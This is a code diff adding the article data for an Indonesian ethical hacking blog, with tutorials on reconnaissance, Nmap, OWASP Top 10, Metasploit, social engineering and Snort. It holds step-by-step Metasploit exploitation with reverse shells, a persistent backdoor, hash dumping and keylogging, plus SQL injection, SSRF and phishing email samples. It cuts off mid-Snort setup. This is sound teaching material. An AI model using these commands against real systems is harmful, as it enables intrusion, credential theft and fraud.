@@ -1,0 +1,1698 @@
+// Sample articles data for ethical hacking blog
+export const articles = [
+  {
+    id: 1,
+    title: "Pengenalan Ethical Hacking dan Penetration Testing",
+    slug: "pengenalan-ethical-hacking",
+    excerpt: "Memahami dasar-dasar ethical hacking, perbedaan dengan hacking ilegal, dan pentingnya dalam keamanan siber modern.",
+    category: "Dasar",
+    author: "Admin",
+    date: "2024-10-01",
+    readTime: 8,
+    image: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80",
+    content: `
+# Pengenalan Ethical Hacking dan Penetration Testing
+
+## Apa itu Ethical Hacking?
+
+Ethical hacking adalah praktik menguji sistem komputer, jaringan, atau aplikasi web untuk menemukan kerentanan keamanan yang dapat dieksploitasi oleh pihak jahat. Berbeda dengan hacking ilegal, ethical hacker bekerja dengan izin resmi dari pemilik sistem.
+
+## Perbedaan Ethical Hacker vs Black Hat Hacker
+
+### Ethical Hacker (White Hat)
+- Bekerja dengan izin resmi
+- Melaporkan kerentanan kepada pemilik sistem
+- Mematuhi hukum dan etika profesional
+- Bertujuan meningkatkan keamanan
+
+### Black Hat Hacker
+- Melakukan akses tanpa izin
+- Mengeksploitasi kerentanan untuk keuntungan pribadi
+- Melanggar hukum
+- Merusak atau mencuri data
+
+## Metodologi Penetration Testing
+
+1. **Reconnaissance** - Pengumpulan informasi
+2. **Scanning** - Identifikasi port dan layanan aktif
+3. **Gaining Access** - Eksploitasi kerentanan
+4. **Maintaining Access** - Mempertahankan akses ke sistem
+5. **Covering Tracks** - Menghapus jejak (hanya untuk simulasi)
+
+## Tools Populer
+
+- **Kali Linux** - Distribusi Linux untuk pentesting
+- **Nmap** - Network scanner
+- **Metasploit** - Framework eksploitasi
+- **Burp Suite** - Web application security testing
+- **Wireshark** - Network protocol analyzer
+
+## Kesimpulan
+
+Ethical hacking adalah profesi yang sangat penting dalam era digital. Dengan meningkatnya ancaman siber, kebutuhan akan profesional keamanan yang terampil terus berkembang.
+    `
+  },
+  {
+    id: 2,
+    title: "Reconnaissance: Fase Awal Penetration Testing",
+    slug: "reconnaissance-fase-awal",
+    excerpt: "Pelajari teknik pengumpulan informasi (footprinting) sebagai langkah pertama dalam penetration testing yang efektif.",
+    category: "Teknik",
+    author: "Admin",
+    date: "2024-10-03",
+    readTime: 10,
+    image: "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&q=80",
+    content: `
+# Reconnaissance: Fase Awal Penetration Testing
+
+## Pengertian Reconnaissance
+
+Reconnaissance atau pengintaian adalah fase pertama dalam penetration testing dimana ethical hacker mengumpulkan sebanyak mungkin informasi tentang target tanpa melakukan interaksi langsung dengan sistem.
+
+## Jenis Reconnaissance
+
+### 1. Passive Reconnaissance
+Mengumpulkan informasi tanpa berinteraksi langsung dengan target:
+
+- **WHOIS Lookup** - Informasi domain dan registrar
+- **DNS Enumeration** - Catatan DNS publik
+- **Search Engine** - Google dorking, Shodan
+- **Social Media** - LinkedIn, Twitter untuk informasi karyawan
+- **Public Records** - Dokumen publik perusahaan
+
+#### Contoh Google Dork:
+\`\`\`
+site:example.com filetype:pdf
+inurl:admin
+intitle:"index of" password
+\`\`\`
+
+### 2. Active Reconnaissance
+Berinteraksi langsung dengan target untuk mendapatkan informasi:
+
+- **Port Scanning** dengan Nmap
+- **Web Crawling** untuk mapping aplikasi web
+- **Banner Grabbing** untuk identifikasi versi software
+- **Network Sniffing**
+
+#### Contoh Nmap Scan:
+\`\`\`bash
+# Basic scan
+nmap -sV target.com
+
+# Aggressive scan with OS detection
+nmap -A -T4 target.com
+
+# Scan specific ports
+nmap -p 80,443,8080 target.com
+\`\`\`
+
+## Tools Reconnaissance
+
+1. **theHarvester** - Email dan subdomain gathering
+2. **Maltego** - Visual link analysis
+3. **Recon-ng** - Web reconnaissance framework
+4. **Shodan** - Search engine untuk IoT devices
+5. **SpiderFoot** - OSINT automation
+
+## Best Practices
+
+- Selalu dapatkan izin tertulis sebelum melakukan active recon
+- Dokumentasikan semua findings
+- Jangan melakukan reconnaissance yang terlalu agresif
+- Patuhi scope yang telah disepakati
+
+## Kesimpulan
+
+Reconnaissance yang baik adalah fondasi dari penetration testing yang sukses. Semakin banyak informasi yang dikumpulkan, semakin efektif serangan yang dapat dilakukan (dalam konteks testing yang legal).
+    `
+  },
+  {
+    id: 3,
+    title: "Keamanan Jaringan: Network Scanning dengan Nmap",
+    slug: "network-scanning-nmap",
+    excerpt: "Tutorial lengkap menggunakan Nmap untuk scanning jaringan, identifikasi port, dan deteksi layanan dalam penetration testing.",
+    category: "Tools",
+    author: "Admin",
+    date: "2024-10-05",
+    readTime: 12,
+    image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&q=80",
+    content: `
+# Keamanan Jaringan: Network Scanning dengan Nmap
+
+## Apa itu Nmap?
+
+Nmap (Network Mapper) adalah tool open-source untuk network discovery dan security auditing. Tool ini digunakan untuk:
+- Menemukan host yang aktif dalam jaringan
+- Identifikasi port yang terbuka
+- Deteksi layanan dan versinya
+- Deteksi sistem operasi
+- Menemukan kerentanan
+
+## Instalasi Nmap
+
+### Linux
+\`\`\`bash
+sudo apt update
+sudo apt install nmap
+\`\`\`
+
+### macOS
+\`\`\`bash
+brew install nmap
+\`\`\`
+
+### Windows
+Download installer dari https://nmap.org/download.html
+
+## Tipe-tipe Scan
+
+### 1. TCP Connect Scan (-sT)
+Scan paling basic yang membuat koneksi TCP penuh:
+\`\`\`bash
+nmap -sT 192.168.1.1
+\`\`\`
+
+### 2. SYN Scan (-sS)
+"Stealth" scan yang tidak membuat koneksi penuh:
+\`\`\`bash
+sudo nmap -sS 192.168.1.1
+\`\`\`
+
+### 3. UDP Scan (-sU)
+Scan untuk port UDP:
+\`\`\`bash
+sudo nmap -sU 192.168.1.1
+\`\`\`
+
+### 4. Version Detection (-sV)
+Deteksi versi layanan yang berjalan:
+\`\`\`bash
+nmap -sV 192.168.1.1
+\`\`\`
+
+### 5. OS Detection (-O)
+Deteksi sistem operasi:
+\`\`\`bash
+sudo nmap -O 192.168.1.1
+\`\`\`
+
+## Scan Tingkat Lanjut
+
+### Aggressive Scan
+\`\`\`bash
+nmap -A -T4 target.com
+# -A: Enable OS detection, version detection, script scanning
+# -T4: Timing template (faster)
+\`\`\`
+
+### Scan dengan NSE Scripts
+\`\`\`bash
+# Vulnerability scan
+nmap --script vuln target.com
+
+# HTTP enumeration
+nmap --script http-enum target.com
+
+# SMB enumeration
+nmap --script smb-enum-shares,smb-enum-users target.com
+\`\`\`
+
+### Scan Range Network
+\`\`\`bash
+# Scan subnet
+nmap 192.168.1.0/24
+
+# Scan multiple hosts
+nmap 192.168.1.1-50
+
+# Scan from file
+nmap -iL targets.txt
+\`\`\`
+
+## Output Formats
+
+\`\`\`bash
+# Normal output
+nmap -oN scan.txt target.com
+
+# XML output
+nmap -oX scan.xml target.com
+
+# All formats
+nmap -oA scan target.com
+\`\`\`
+
+## Timing dan Performance
+
+\`\`\`bash
+# Timing templates (0-5)
+# -T0: Paranoid (IDS evasion)
+# -T1: Sneaky
+# -T2: Polite
+# -T3: Normal (default)
+# -T4: Aggressive
+# -T5: Insane
+
+nmap -T4 target.com
+\`\`\`
+
+## Firewall Evasion
+
+\`\`\`bash
+# Fragment packets
+nmap -f target.com
+
+# Spoof MAC address
+nmap --spoof-mac Apple target.com
+
+# Decoy scan
+nmap -D RND:10 target.com
+\`\`\`
+
+## Best Practices
+
+1. **Selalu dapatkan izin** sebelum scanning
+2. **Gunakan timing yang tepat** - jangan terlalu agresif
+3. **Dokumentasikan hasil** scan dengan baik
+4. **Patuhi scope** yang telah ditentukan
+5. **Hindari scan production** pada jam sibuk
+
+## Kesimpulan
+
+Nmap adalah tool fundamental dalam toolkit ethical hacker. Menguasai Nmap akan sangat membantu dalam fase scanning dan enumeration dalam penetration testing.
+    `
+  },
+  {
+    id: 4,
+    title: "Web Application Security: OWASP Top 10",
+    slug: "owasp-top-10",
+    excerpt: "Memahami 10 kerentanan aplikasi web paling kritis menurut OWASP dan cara mengidentifikasinya dalam security testing.",
+    category: "Web Security",
+    author: "Admin",
+    date: "2024-10-06",
+    readTime: 15,
+    image: "https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800&q=80",
+    content: `
+# Web Application Security: OWASP Top 10
+
+## Apa itu OWASP Top 10?
+
+OWASP (Open Web Application Security Project) Top 10 adalah daftar 10 risiko keamanan aplikasi web paling kritis yang diperbarui setiap beberapa tahun. Versi terbaru (2021) mencakup:
+
+## 1. Broken Access Control
+
+### Deskripsi
+Kegagalan dalam pembatasan akses pengguna, memungkinkan user mengakses resource yang tidak seharusnya.
+
+### Contoh Serangan
+\`\`\`
+# IDOR (Insecure Direct Object Reference)
+https://example.com/user/profile?id=123
+# Attacker change to
+https://example.com/user/profile?id=124
+\`\`\`
+
+### Pencegahan
+- Implementasi proper authorization checks
+- Deny by default
+- Gunakan indirect reference maps
+
+## 2. Cryptographic Failures
+
+### Deskripsi
+Kegagalan dalam enkripsi data sensitif, baik saat transit maupun at rest.
+
+### Contoh
+- Password disimpan dalam plain text
+- HTTP digunakan untuk transfer data sensitif
+- Weak encryption algorithms (MD5, SHA1)
+
+### Pencegahan
+- Gunakan HTTPS untuk semua komunikasi
+- Enkripsi data sensitif at rest
+- Gunakan algoritma modern (AES-256, bcrypt)
+
+## 3. Injection
+
+### Deskripsi
+Kode berbahaya dimasukkan ke dalam aplikasi melalui input yang tidak divalidasi.
+
+### SQL Injection
+\`\`\`sql
+-- Vulnerable code
+SELECT * FROM users WHERE username='$username' AND password='$password'
+
+-- Attack
+username: admin'--
+password: anything
+
+-- Resulting query
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+\`\`\`
+
+### Pencegahan
+- Gunakan prepared statements
+- Input validation dan sanitization
+- Principle of least privilege untuk database access
+
+## 4. Insecure Design
+
+### Deskripsi
+Kekurangan dalam desain keamanan aplikasi dari awal development.
+
+### Contoh
+- Tidak ada rate limiting pada login
+- Tidak ada secure password recovery
+- Missing business logic validation
+
+### Pencegahan
+- Threat modeling sejak awal
+- Secure design patterns
+- Security by design approach
+
+## 5. Security Misconfiguration
+
+### Deskripsi
+Konfigurasi keamanan yang tidak tepat atau default.
+
+### Contoh
+- Default credentials masih aktif
+- Directory listing enabled
+- Unnecessary features enabled
+- Error messages yang terlalu detail
+
+### Pencegahan
+- Hardening guidelines
+- Automated security scanning
+- Regular security audits
+- Minimal platform
+
+## 6. Vulnerable and Outdated Components
+
+### Deskripsi
+Penggunaan library, framework, atau komponen dengan kerentanan known.
+
+### Contoh
+\`\`\`json
+{
+  "dependencies": {
+    "jquery": "1.9.0", // Vulnerable version
+    "lodash": "4.17.0" // Vulnerable version
+  }
+}
+\`\`\`
+
+### Pencegahan
+- Regular dependency updates
+- Vulnerability scanning (npm audit, Snyk)
+- Remove unused dependencies
+
+## 7. Identification and Authentication Failures
+
+### Deskripsi
+Kelemahan dalam autentikasi dan session management.
+
+### Contoh
+- Weak password policy
+- Session fixation
+- Credential stuffing possible
+- No multi-factor authentication
+
+### Pencegahan
+- Strong password requirements
+- Multi-factor authentication
+- Secure session management
+- Rate limiting
+- Account lockout mechanisms
+
+## 8. Software and Data Integrity Failures
+
+### Deskripsi
+Kegagalan dalam memastikan integritas software dan data.
+
+### Contoh
+- Auto-update tanpa verifikasi signature
+- Insecure deserialization
+- CI/CD pipeline tidak secure
+
+### Pencegahan
+- Digital signatures
+- Verify integrity (checksums)
+- Secure CI/CD pipeline
+- Review dependencies
+
+## 9. Security Logging and Monitoring Failures
+
+### Deskripsi
+Kurangnya logging dan monitoring untuk mendeteksi aktivitas suspicious.
+
+### Contoh
+- Login failures tidak di-log
+- Tidak ada alerting untuk aktivitas suspicious
+- Logs tidak di-review
+
+### Pencegahan
+- Comprehensive logging
+- Real-time monitoring
+- Security Information and Event Management (SIEM)
+- Incident response plan
+
+## 10. Server-Side Request Forgery (SSRF)
+
+### Deskripsi
+Aplikasi melakukan request ke URL yang disediakan user tanpa validasi.
+
+### Contoh Serangan
+\`\`\`
+# User controlled URL
+https://example.com/fetch?url=http://internal-server/admin
+
+# Attacker dapat access internal resources
+https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
+\`\`\`
+
+### Pencegahan
+- Whitelist allowed domains
+- Network segmentation
+- Input validation
+- Disable unused URL schemas
+
+## Testing Tools
+
+### Burp Suite
+- Web proxy untuk intercept requests
+- Scanner untuk automated testing
+- Repeater untuk manual testing
+
+### OWASP ZAP
+- Open-source alternative untuk Burp
+- Automated dan manual testing
+- API scanning
+
+### Nikto
+- Web server scanner
+- Checks untuk misconfigurations
+
+## Kesimpulan
+
+Memahami OWASP Top 10 adalah fundamental dalam web application security testing. Ethical hacker harus familiar dengan setiap kategori dan cara mengidentifikasi serta mengeksploitasi (dalam konteks testing) kerentanan ini.
+
+## Resources
+
+- [OWASP Top 10 Official](https://owasp.org/Top10/)
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+    `
+  },
+  {
+    id: 5,
+    title: "Metasploit Framework: Exploitation Tool untuk Pentester",
+    slug: "metasploit-framework",
+    excerpt: "Panduan menggunakan Metasploit Framework untuk exploitation dalam penetration testing secara legal dan etis.",
+    category: "Tools",
+    author: "Admin",
+    date: "2024-10-06",
+    readTime: 14,
+    image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80",
+    content: `
+# Metasploit Framework: Exploitation Tool untuk Pentester
+
+## Apa itu Metasploit?
+
+Metasploit Framework adalah platform open-source untuk developing, testing, dan executing exploit code. Tool ini sangat populer di kalangan pentester dan digunakan untuk:
+- Exploitation
+- Payload delivery
+- Post-exploitation
+- Vulnerability assessment
+
+## Arsitektur Metasploit
+
+### Komponen Utama
+
+1. **Exploits** - Kode yang memanfaatkan kerentanan
+2. **Payloads** - Kode yang dijalankan setelah exploitation
+3. **Auxiliary** - Tools tambahan (scanner, fuzzer, dll)
+4. **Encoders** - Encode payload untuk evade detection
+5. **Post** - Post-exploitation modules
+6. **Nops** - No-operation untuk payload stability
+
+## Memulai Metasploit
+
+### Instalasi
+\`\`\`bash
+# Sudah terinstall di Kali Linux
+
+# Update Metasploit
+sudo apt update
+sudo msfupdate
+\`\`\`
+
+### Menjalankan Metasploit Console
+\`\`\`bash
+msfconsole
+\`\`\`
+
+## Basic Commands
+
+\`\`\`bash
+# Search for exploits
+msf6 > search smb
+
+# Show options for module
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > show options
+
+# Set parameters
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
+
+# Show available payloads
+msf6 exploit(ms17_010_eternalblue) > show payloads
+
+# Set payload
+msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+
+# Run exploit
+msf6 exploit(ms17_010_eternalblue) > exploit
+\`\`\`
+
+## Payloads
+
+### Jenis Payloads
+
+#### 1. Singles
+Standalone payload, tidak memerlukan download tambahan
+\`\`\`bash
+windows/shell_reverse_tcp
+\`\`\`
+
+#### 2. Stagers
+Payload kecil yang download stage berikutnya
+\`\`\`bash
+windows/meterpreter/reverse_tcp
+\`\`\`
+
+#### 3. Stages
+Payload yang di-download oleh stager
+\`\`\`bash
+windows/meterpreter
+\`\`\`
+
+## Meterpreter
+
+Meterpreter adalah advanced payload yang berjalan in-memory dan menyediakan interactive shell.
+
+### Basic Meterpreter Commands
+\`\`\`bash
+# System information
+meterpreter > sysinfo
+
+# User information
+meterpreter > getuid
+
+# Process list
+meterpreter > ps
+
+# Privilege escalation
+meterpreter > getsystem
+
+# Dump hashes
+meterpreter > hashdump
+
+# Screenshot
+meterpreter > screenshot
+
+# Keylogger
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+
+# File operations
+meterpreter > download c:\\\\passwords.txt
+meterpreter > upload backdoor.exe c:\\\\temp
+
+# Shell access
+meterpreter > shell
+\`\`\`
+
+## Scanning dengan Metasploit
+
+### Port Scanning
+\`\`\`bash
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/portscan/tcp) > run
+\`\`\`
+
+### SMB Version Detection
+\`\`\`bash
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/smb/smb_version) > run
+\`\`\`
+
+### HTTP Title Grabbing
+\`\`\`bash
+msf6 > use auxiliary/scanner/http/title
+msf6 auxiliary(scanner/http/title) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/http/title) > run
+\`\`\`
+
+## Popular Exploits
+
+### 1. EternalBlue (MS17-010)
+\`\`\`bash
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
+msf6 exploit(ms17_010_eternalblue) > exploit
+\`\`\`
+
+### 2. Apache Struts2 RCE
+\`\`\`bash
+msf6 > use exploit/multi/http/struts2_content_type_ognl
+msf6 exploit(struts2_content_type_ognl) > set RHOSTS 192.168.1.100
+msf6 exploit(struts2_content_type_ognl) > set RPORT 8080
+msf6 exploit(struts2_content_type_ognl) > set TARGETURI /struts2-showcase
+msf6 exploit(struts2_content_type_ognl) > exploit
+\`\`\`
+
+### 3. PHP CGI Argument Injection
+\`\`\`bash
+msf6 > use exploit/multi/http/php_cgi_arg_injection
+msf6 exploit(php_cgi_arg_injection) > set RHOSTS 192.168.1.100
+msf6 exploit(php_cgi_arg_injection) > exploit
+\`\`\`
+
+## Post-Exploitation
+
+### Privilege Escalation
+\`\`\`bash
+# Try to get SYSTEM
+meterpreter > getsystem
+
+# Bypass UAC
+meterpreter > background
+msf6 > use exploit/windows/local/bypassuac
+msf6 exploit(bypassuac) > set SESSION 1
+msf6 exploit(bypassuac) > exploit
+\`\`\`
+
+### Persistence
+\`\`\`bash
+# Create persistent backdoor
+meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50
+\`\`\`
+
+### Pivoting
+\`\`\`bash
+# Add route to internal network
+meterpreter > run autoroute -s 10.1.1.0/24
+
+# Port forwarding
+meterpreter > portfwd add -l 3389 -p 3389 -r 10.1.1.100
+\`\`\`
+
+## Database Integration
+
+Metasploit dapat menyimpan hasil scan ke database:
+
+\`\`\`bash
+# Check database status
+msf6 > db_status
+
+# Import Nmap scan
+msf6 > db_import nmap_scan.xml
+
+# Show hosts
+msf6 > hosts
+
+# Show services
+msf6 > services
+
+# Show vulnerabilities
+msf6 > vulns
+\`\`\`
+
+## Best Practices
+
+1. **Selalu dapatkan izin tertulis** sebelum exploitation
+2. **Pahami target** sebelum running exploit
+3. **Backup data** target jika memungkinkan
+4. **Dokumentasikan semua aksi** yang dilakukan
+5. **Gunakan staging environment** untuk testing exploit
+6. **Patuhi scope** yang telah disepakati
+7. **Clean up** setelah testing selesai
+
+## Resources
+
+- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
+- [Rapid7 Metasploit Documentation](https://docs.rapid7.com/metasploit/)
+- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)
+
+## Kesimpulan
+
+Metasploit adalah tool yang sangat powerful untuk penetration testing. Namun, dengan great power comes great responsibility. Gunakan tool ini hanya untuk tujuan legal dan ethical testing dengan proper authorization.
+    `
+  },
+  {
+    id: 6,
+    title: "Social Engineering: Teknik Manipulasi dalam Cybersecurity",
+    slug: "social-engineering",
+    excerpt: "Memahami berbagai teknik social engineering yang digunakan attacker dan cara melindungi organisasi dari serangan ini.",
+    category: "Social Engineering",
+    author: "Admin",
+    date: "2024-10-06",
+    readTime: 11,
+    image: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?w=800&q=80",
+    content: `
+# Social Engineering: Teknik Manipulasi dalam Cybersecurity
+
+## Apa itu Social Engineering?
+
+Social engineering adalah teknik manipulasi psikologis untuk mendapatkan informasi rahasia atau akses ke sistem dengan memanfaatkan faktor manusia sebagai "weakest link" dalam keamanan.
+
+## Prinsip Psikologis yang Dieksploitasi
+
+### 1. Authority (Otoritas)
+Orang cenderung mematuhi yang memiliki otoritas
+- Berpura-pura sebagai manager atau IT support
+- Menggunakan logo dan branding resmi
+
+### 2. Urgency (Urgensi)
+Membuat target merasa harus segera bertindak
+- "Akun Anda akan diblokir dalam 24 jam!"
+- "Butuh password sekarang untuk meeting urgent"
+
+### 3. Trust (Kepercayaan)
+Membangun rapport dengan target
+- Mengetahui informasi personal target
+- Menggunakan nama kolega atau teman
+
+### 4. Fear (Ketakutan)
+Membuat target takut akan konsekuensi
+- Ancaman legal action
+- Kehilangan data atau uang
+
+### 5. Greed (Keserakahan)
+Menawarkan sesuatu yang terlalu bagus
+- Hadiah gratis
+- Opportunity investasi "pasti untung"
+
+## Jenis-jenis Serangan Social Engineering
+
+### 1. Phishing
+
+Email atau pesan yang menyamar sebagai entitas terpercaya.
+
+#### Contoh Email Phishing:
+\`\`\`
+From: security@paypa1.com (perhatikan angka 1)
+Subject: Urgent: Verify Your Account
+
+Dear Customer,
+
+We detected unusual activity on your account. 
+Please verify your identity by clicking here:
+http://paypal-verify.suspicious-site.com
+
+If you don't verify within 24 hours, 
+your account will be permanently suspended.
+
+Best regards,
+PayPal Security Team
+\`\`\`
+
+#### Red Flags:
+- Sender email mencurigakan (paypa1.com)
+- URL tidak match dengan domain resmi
+- Urgency yang berlebihan
+- Grammar errors
+- Generic greeting
+
+### 2. Spear Phishing
+
+Phishing yang ditargetkan ke individu atau organisasi spesifik.
+
+\`\`\`
+From: ceo@company.com (spoofed)
+To: finance@company.com
+Subject: Urgent Wire Transfer
+
+Hi Sarah,
+
+I'm in a meeting with potential investor. 
+Need you to wire transfer $50,000 to this account immediately:
+
+Account: 1234567890
+Bank: XYZ Bank
+Name: ABC Consulting
+
+This is time sensitive. Please confirm when done.
+
+Best,
+John (CEO)
+\`\`\`
+
+### 3. Vishing (Voice Phishing)
+
+Phishing melalui telepon.
+
+**Contoh Scenario:**
+\`\`\`
+Caller: "Hi, this is John from IT Support. 
+We're experiencing a security breach and need 
+to verify all user accounts. Can you provide 
+your username and password to confirm you're 
+not affected?"
+\`\`\`
+
+### 4. Smishing (SMS Phishing)
+
+Phishing melalui SMS.
+
+\`\`\`
+"Congratulations! You won $10,000. 
+Click here to claim: bit.ly/scam123"
+
+"Your bank account has been locked. 
+Verify here: suspicious-link.com"
+\`\`\`
+
+### 5. Pretexting
+
+Membuat skenario atau "pretext" untuk mendapatkan informasi.
+
+**Contoh:**
+\`\`\`
+Attacker menghubungi HR:
+"Hi, I'm from the audit department. 
+We need employee records for compliance review. 
+Can you email me the spreadsheet?"
+\`\`\`
+
+### 6. Baiting
+
+Menawarkan sesuatu untuk menginfeksi sistem.
+
+**Contoh:**
+- USB drive berlabel "Salary 2024" ditaruh di parking lot
+- "Free Movie Download" website yang menginstall malware
+- Fake software update
+
+### 7. Quid Pro Quo
+
+Menawarkan layanan dengan imbalan informasi.
+
+**Contoh:**
+\`\`\`
+"Hi, this is IT Support. We're doing 
+free system optimization for all employees. 
+I just need to remote into your computer. 
+Can you install this software?"
+\`\`\`
+
+### 8. Tailgating / Piggybacking
+
+Mengikuti orang yang authorized masuk ke area restricted.
+
+**Scenario:**
+- Attacker membawa box heavy, meminta employee untuk "hold the door"
+- Menyamar sebagai delivery person atau cleaning service
+
+## Physical Social Engineering
+
+### Dumpster Diving
+Mencari informasi sensitif di tempat sampah:
+- Dokumen tidak di-shred dengan proper
+- Old hard drives tidak di-destroy
+- Sticky notes dengan password
+
+### Shoulder Surfing
+Mengintip layar atau keyboard orang lain:
+- Di coffee shop
+- Di ATM
+- Di public transportation
+
+## Tools untuk Awareness Testing
+
+### SET (Social Engineering Toolkit)
+\`\`\`bash
+# Install SET
+sudo apt install set
+
+# Run SET
+sudo setoolkit
+
+# Phishing attack vectors
+1) Spear-Phishing Attack Vectors
+2) Website Attack Vectors
+3) Infectious Media Generator
+4) Create a Payload and Listener
+\`\`\`
+
+### Gophish
+Platform open-source untuk phishing simulation.
+
+Features:
+- Email template management
+- Landing page cloning
+- Campaign tracking
+- Real-time results
+
+### King Phisher
+Phishing campaign toolkit dengan GUI.
+
+## Defense Against Social Engineering
+
+### Untuk Individu
+
+1. **Verify Identity**
+   - Callback ke nomor resmi
+   - Konfirmasi melalui channel berbeda
+
+2. **Think Before You Click**
+   - Hover link untuk check URL
+   - Jangan download attachment mencurigakan
+
+3. **Be Skeptical**
+   - Too good to be true = probably is
+   - Urgency adalah red flag
+
+4. **Protect Personal Information**
+   - Jangan overshare di social media
+   - Be careful dengan public WiFi
+
+5. **Use Multi-Factor Authentication**
+   - Bahkan jika password leaked, account masih aman
+
+### Untuk Organisasi
+
+1. **Security Awareness Training**
+   - Regular training untuk employees
+   - Simulated phishing campaigns
+   - Report suspicious activities
+
+2. **Technical Controls**
+   - Email filtering
+   - Web content filtering
+   - Endpoint protection
+
+3. **Policies dan Procedures**
+   - Verification procedures untuk sensitive requests
+   - Clear reporting channels
+   - Access control policies
+
+4. **Physical Security**
+   - Badge system
+   - Visitor logs
+   - CCTV monitoring
+   - Clean desk policy
+
+5. **Incident Response Plan**
+   - Clear steps jika terjadi breach
+   - Communication plan
+   - Post-incident analysis
+
+## Red Team Exercise: Social Engineering
+
+### Reconnaissance Phase
+1. OSINT gathering
+2. Identify targets
+3. Map organizational structure
+4. Identify technologies used
+
+### Attack Phase
+1. Craft convincing pretext
+2. Execute attack (with authorization!)
+3. Document all interactions
+4. Record successful techniques
+
+### Reporting Phase
+1. Document findings
+2. Provide evidence
+3. Risk assessment
+4. Remediation recommendations
+
+## Real-World Examples
+
+### Target Data Breach (2013)
+- Attackers used phishing email ke HVAC vendor
+- Gained access ke Target's network
+- Stole 40 million credit card numbers
+
+### Twitter Bitcoin Scam (2020)
+- Attackers used social engineering on Twitter employees
+- Compromised admin tools
+- Hijacked high-profile accounts
+
+### Ubiquiti Networks (2015)
+- CEO fraud (spear phishing)
+- Finance employee wired $46.7 million ke attackers
+- Think they were following CEO orders
+
+## Kesimpulan
+
+Social engineering adalah ancaman serius karena menargetkan human vulnerability, bukan technical. Teknologi terbaik sekalipun tidak bisa melindungi jika manusianya tidak aware.
+
+Key takeaways:
+- Humans are often the weakest link
+- Technical controls alone are not enough
+- Awareness training adalah critical
+- Verify, verify, verify!
+
+## Resources
+
+- [Social Engineering Framework](http://www.social-engineer.org)
+- [SANS Security Awareness](https://www.sans.org/security-awareness-training/)
+- [KnowBe4 Security Awareness](https://www.knowbe4.com/)
+    `
+  },
+  {
+    id: 7,
+    title: "Snort IDS: Intrusion Detection System untuk Network Security",
+    slug: "snort-ids-intrusion-detection",
+    excerpt: "Panduan lengkap implementasi dan konfigurasi Snort IDS untuk monitoring dan deteksi intrusi pada jaringan secara real-time.",
+    category: "Network Security",
+    author: "Lubellion",
+    date: "2024-10-06",
+    readTime: 18,
+    image: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800&q=80",
+    content: `
+# Snort IDS: Intrusion Detection System untuk Network Security
+
+## Apa itu Snort?
+
+Snort adalah open-source Network Intrusion Detection System (NIDS) dan Intrusion Prevention System (IPS) yang dapat melakukan:
+- Real-time traffic analysis
+- Packet logging
+- Protocol analysis
+- Content searching/matching
+- Deteksi berbagai serangan dan probes
+
+Snort dikembangkan oleh Martin Roesch pada tahun 1998 dan sekarang dikelola oleh Cisco.
+
+## Arsitektur Snort
+
+### Komponen Utama
+
+1. **Packet Decoder** - Menangkap dan decode paket network
+2. **Preprocessor** - Normalisasi dan analisis awal traffic
+3. **Detection Engine** - Menerapkan rules untuk deteksi
+4. **Logging and Alerting** - Mencatat dan memberi alert
+5. **Output Modules** - Format output (database, file, syslog)
+
+### Mode Operasi Snort
+
+#### 1. Sniffer Mode
+Mode dasar untuk monitoring packet real-time
+\`\`\`bash
+# Sniff mode - display packets
+snort -v
+
+# Verbose mode dengan data link headers
+snort -vd
+
+# Full packet decode
+snort -vde
+\`\`\`
+
+#### 2. Packet Logger Mode
+Menyimpan packet ke disk untuk analisis
+\`\`\`bash
+# Log packets to directory
+snort -l /var/log/snort
+
+# Log dengan timestamp
+snort -l /var/log/snort -K ascii
+
+# Binary log format
+snort -l /var/log/snort -b
+\`\`\`
+
+#### 3. Network Intrusion Detection Mode
+Mode IDS dengan rule-based detection
+\`\`\`bash
+# NIDS mode with config
+snort -c /etc/snort/snort.conf
+
+# Specify network interface
+snort -i eth0 -c /etc/snort/snort.conf
+
+# Alert to console
+snort -A console -c /etc/snort/snort.conf
+\`\`\`
+
+## Instalasi Snort
+
+### Ubuntu/Debian
+\`\`\`bash
+# Update system
+sudo apt update
+
+# Install dependencies
+sudo apt install -y build-essential libpcap-dev libpcre3-dev \\
+    libdumbnet-dev bison flex zlib1g-dev liblzma-dev \\
+    openssl libssl-dev libnghttp2-dev
+
+# Download Snort
+wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
+tar xvzf snort-2.9.20.tar.gz
+cd snort-2.9.20
+
+# Compile and install
+./configure --enable-sourcefire
+make
+sudo make install
+
+# Update shared libraries
+sudo ldconfig
+
+# Verify installation
+snort -V
+\`\`\`
+
+### Konfigurasi Dasar
+
+#### 1. Buat Direktori dan User
+\`\`\`bash
+# Create Snort user
+sudo groupadd snort
